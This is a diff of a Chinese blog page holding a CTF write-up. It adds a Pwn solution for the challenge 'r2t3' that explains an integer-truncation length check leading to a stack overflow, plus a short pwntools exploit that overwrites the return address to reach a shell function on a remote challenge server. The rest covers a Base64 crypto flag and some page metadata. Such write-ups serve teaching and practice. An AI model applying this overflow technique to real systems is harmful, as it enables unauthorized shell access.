@@ -443,14 +443,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.5k
+                    1.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    6 分
+                    7 分
                 </div>
                 
 
@@ -498,7 +498,33 @@
 <p>真的是，技术不行，尽力做了已经；接下来把我做出来的整理一下：</p>
 <p><strong><em>说明一下，因为打比赛的时候没有及时整理记录，正好校外赛在BUU，所以用了里面的题目写这篇Blog</em></strong></p>
 <p><strong><em>注：想刷题、想提高，就上<a href="https://buuoj.cn" target="_blank" rel="noopener">BUUCTF</a> // 绝对没打广告 ^_^</em></strong></p>
-<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h3 id="r2t3"><a href="#r2t3" class="headerlink" title="r2t3"></a>r2t3</h3><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h3 id="y1ng"><a href="#y1ng" class="headerlink" title="y1ng"></a>y1ng</h3><p>题目有如下信息：<strong>“QkpEe1czbGMwbWVfVDBfQkpEQ1RGfQ==”</strong></p>
+<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h3 id="r2t3"><a href="#r2t3" class="headerlink" title="r2t3"></a>r2t3</h3><p>这是一道简单的栈溢出的题目，下载附件，检查一波：</p>
+<p><img src="/images/r2t3_1.png" alt="r2t3_1"></p>
+<p>32位程序，开了NX，放进ida：</p>
+<p><img src="/images/r2t3_2.png" alt="r2t3_2"></p>
+<p>这程序很简单，输入一个姓名，然后进入name_check()函数，点开函数来看：</p>
+<p><img src="/images/r2t3_3.png" alt="r2t3_3"></p>
+<p>这里的_int8变量最多可以存储256大小的数字，如果这个数字为257，那么在内存中其实是257-256=1，这里v3的</p>
+<p>长度只能是[3，8)个字符，考虑到存在栈溢出，所以v3也可以是[259，264）</p>
+<p>因为下面有strcpy()函数，所以查看一波空间：</p>
+<p><img src="/images/r2t3_5.png" alt="r2t3_4"></p>
+<p>再寻找一波，又发现了一个重要点：</p>
+<p><img src="/images/r2t3_4.png" alt="r2t3_4"></p>
+<p>这里发现了这个函数，这就会了吧，利用栈溢出，直接可以getshell，下面附上exp：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+a <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'52.82.12.160'</span><span class="token punctuation">,</span><span class="token number">21013</span><span class="token punctuation">)</span>
+
+a<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Please input your name:'</span><span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span> <span class="token number">21</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x0804858B</span><span class="token punctuation">)</span>
+
+payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">259</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>
+
+a<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+a<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h3 id="y1ng"><a href="#y1ng" class="headerlink" title="y1ng"></a>y1ng</h3><p>题目有如下信息：<strong>“QkpEe1czbGMwbWVfVDBfQkpEQ1RGfQ==”</strong></p>
 <p>这是一道签到题目，观察可知Base64加密，直接扔进网站即可</p>
 <p>附上网址：<a href="http://tool.chinaz.com/Tools/Base64.aspx" target="_blank" rel="noopener">Base64</a></p>
 <p>解出来就可以了：</p>
@@ -568,7 +594,7 @@ MIH{cwdp0t_Mfed3_u0fa3_sF_geqcgeqc_ZQ_Af4aw}</code></pre><p>一看便知，只�
 <p>直接发现flag：</p>
 <p><strong><em>flag：BJD{S1mple_ReV3r5e_W1th_0D_0r_IDA}</em></strong></p>
 <h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>由于我不是web选手，不会做web题目，所以web爆零，另外的Blockchain和Programming也不会做；</p>
-<p>这篇wp把会做的整理了吧，后面补完题目，继续整理 <del>_</del></p>
+<p>这篇wp把会做的整理了吧，后面补完题目，继续整理 +_=</p>
 <p>实力就这样，技不如人，甘拜下风！</p>
 <script>
         document.querySelectorAll('.github-emoji')
@@ -1120,7 +1146,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
                         <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
                         <br>
                         
-                            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span class="white-color">21.4k</span>&nbsp;字
+                            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span class="white-color">21.6k</span>&nbsp;字
                             
                                 
                                     
